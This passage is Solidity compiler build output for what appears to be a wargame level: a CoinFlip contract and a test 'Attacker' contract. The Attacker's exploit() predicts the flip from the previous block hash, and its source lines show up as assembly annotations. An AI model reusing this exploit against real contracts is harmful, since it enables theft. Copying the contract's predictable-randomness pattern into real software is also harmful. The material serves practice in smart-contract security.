										{
											"begin": 1324,
											"end": 1333,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1320,
											"end": 1337,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1311,
											"end": 1317,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1273,
											"end": 1338,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1135,
											"end": 1345,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1388,
											"end": 1395,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1417,
											"end": 1422,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1351,
											"end": 1428,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1539,
											"end": 1544,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1521,
											"end": 1545,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1516,
											"end": 1519,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1509,
											"end": 1546,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1434,
											"end": 1552,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1651,
											"end": 1655,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1689,
											"end": 1691,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1678,
											"end": 1687,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1674,
											"end": 1692,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1770,
											"end": 1771,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1759,
											"end": 1768,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1755,
											"end": 1772,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1746,
											"end": 1752,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1702,
											"end": 1773,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1558,
											"end": 1780,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1834,
											"end": 1911,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1831,
											"end": 1832,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1824,
											"end": 1912,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1931,
											"end": 1935,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 1928,
											"end": 1929,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1921,
											"end": 1936,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1955,
											"end": 1959,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1952,
											"end": 1953,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1945,
											"end": 1960,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2012,
											"end": 2016,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 2050,
											"end": 2051,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2032,
											"end": 2052,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "tag",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 2032,
											"end": 2052,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2027,
											"end": 2052,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2084,
											"end": 2085,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2066,
											"end": 2086,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 2066,
											"end": 2086,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2061,
											"end": 2086,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2110,
											"end": 2111,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2107,
											"end": 2108,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2103,
											"end": 2112,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2095,
											"end": 2112,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2095,
											"end": 2112,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2134,
											"end": 2135,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2128,
											"end": 2132,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2125,
											"end": 2136,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2139,
											"end": 2157,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2139,
											"end": 2157,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2122,
											"end": 2159,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1972,
											"end": 2166,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2172,
											"end": 2352,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 2172,
											"end": 2352,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2220,
											"end": 2297,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2217,
											"end": 2218,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2210,
											"end": 2298,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2317,
											"end": 2321,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 2314,
											"end": 2315,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2307,
											"end": 2322,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2341,
											"end": 2345,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2338,
											"end": 2339,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2331,
											"end": 2346,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2398,
											"end": 2399,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2433,
											"end": 2434,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2415,
											"end": 2435,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "tag",
											"source": 2,
											"value": "69"
										},
										{
											"begin": 2415,
											"end": 2435,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2410,
											"end": 2435,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2410,
											"end": 2435,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2467,
											"end": 2468,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2449,
											"end": 2469,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2449,
											"end": 2469,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2444,
											"end": 2469,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2444,
											"end": 2469,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2488,
											"end": 2489,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 2493,
											"end": 2511,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2493,
											"end": 2511,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 2478,
											"end": 2513,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2535,
											"end": 2536,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2532,
											"end": 2533,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2528,
											"end": 2537,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 2523,
											"end": 2537,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2523,
											"end": 2537,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2358,
											"end": 2543,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2588,
											"end": 2591,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2629,
											"end": 2634,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2611,
											"end": 2635,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "tag",
											"source": 2,
											"value": "74"
										},
										{
											"begin": 2611,
											"end": 2635,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2602,
											"end": 2635,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2602,
											"end": 2635,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2657,
											"end": 2723,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2650,
											"end": 2655,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2647,
											"end": 2724,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2727,
											"end": 2745,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "tag",
											"source": 2,
											"value": "76"
										},
										{
											"begin": 2727,
											"end": 2745,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "tag",
											"source": 2,
											"value": "75"
										},
										{
											"begin": 2644,
											"end": 2747,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2774,
											"end": 2775,
											"name": "PUSH",
											"source": 2,
											"value": "1"
										},
										{
											"begin": 2767,
											"end": 2772,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2763,
											"end": 2776,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2756,
											"end": 2776,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2756,
											"end": 2776,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2549,
											"end": 2782,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"src/level03.sol",
								"tests/test03.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/level03.sol\":\"CoinFlip\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/level03.sol\":{\"keccak256\":\"0xb95bc60e86408dd64b7966baa45eb5ef0590ec2c19e5975041c52077a4f87bcd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://087f97fd09c887feeee644218608b55eed2ece4776a3cdf6fcc369e69819421e\",\"dweb:/ipfs/QmZKXyRfvRUud7RoWu64WgPhnPA3UrufZsRdLJ5XDYgRr2\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "src/level03.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 5,
								"contract": "src/level03.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 8,
								"contract": "src/level03.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"tests/test03.sol": {
				"Attacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_level",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "exploit",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"tests/test03.sol\":87:846  contract Attacker... */\n  mstore(0x40, 0x80)\n    /* \"tests/test03.sol\":150:227  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"tests/test03.sol\":133:227  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"tests/test03.sol\":254:327  constructor(address _level)... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"tests/test03.sol\":313:319  _level */\n  dup1\n    /* \"tests/test03.sol\":296:301  level */\n  0x02\n  0x00\n    /* \"tests/test03.sol\":296:320  level = CoinFlip(_level) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"tests/test03.sol\":254:327  constructor(address _level)... */\n  pop\n    /* \"tests/test03.sol\":87:846  contract Attacker... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"tests/test03.sol\":87:846  contract Attacker... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"tests/test03.sol\":87:846  contract Attacker... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x63d9b770\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"tests/test03.sol\":333:841  function exploit() external ... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"tests/test03.sol\":380:398  uint256 blockValue */\n      0x00\n        /* \"tests/test03.sol\":434:435  1 */\n      0x01\n        /* \"tests/test03.sol\":419:431  block.number */\n      number\n        /* \"tests/test03.sol\":419:435  block.number - 1 */\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n        /* \"tests/test03.sol\":409:436  blockhash(block.number - 1) */\n      blockhash\n        /* \"tests/test03.sol\":401:437  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"tests/test03.sol\":380:437  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"tests/test03.sol\":467:477  blockValue */\n      dup1\n        /* \"tests/test03.sol\":455:463  lastHash */\n      sload(0x00)\n        /* \"tests/test03.sol\":455:477  lastHash == blockValue */\n      sub\n        /* \"tests/test03.sol\":451:516  if (lastHash == blockValue) {... */\n      tag_9\n      jumpi\n        /* \"tests/test03.sol\":493:501  revert() */\n      revert(0x00, 0x00)\n        /* \"tests/test03.sol\":451:516  if (lastHash == blockValue) {... */\n    tag_9:\n        /* \"tests/test03.sol\":541:551  blockValue */\n      dup1\n        /* \"tests/test03.sol\":530:538  lastHash */\n      0x00\n        /* \"tests/test03.sol\":530:551  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"tests/test03.sol\":565:581  uint256 coinFlip */\n      0x00\n        /* \"tests/test03.sol\":597:603  FACTOR */\n      sload(0x01)\n        /* \"tests/test03.sol\":584:594  blockValue */\n      dup3\n        /* \"tests/test03.sol\":584:603  blockValue / FACTOR */\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n        /* \"tests/test03.sol\":565:603  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"tests/test03.sol\":617:626  bool side */\n      0x00\n        /* \"tests/test03.sol\":641:642  1 */\n      0x01\n        /* \"tests/test03.sol\":629:637  coinFlip */\n      dup3\n        /* \"tests/test03.sol\":629:642  coinFlip == 1 */\n      eq\n        /* \"tests/test03.sol\":629:657  coinFlip == 1 ? true : false */\n      tag_12\n      jumpi\n        /* \"tests/test03.sol\":652:657  false */\n      0x00\n        /* \"tests/test03.sol\":629:657  coinFlip == 1 ? true : false */\n      jump(tag_13)\n    tag_12:\n        /* \"tests/test03.sol\":645:649  true */\n      0x01\n        /* \"tests/test03.sol\":629:657  coinFlip == 1 ? true : false */\n    tag_13:\n        /* \"tests/test03.sol\":617:657  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* 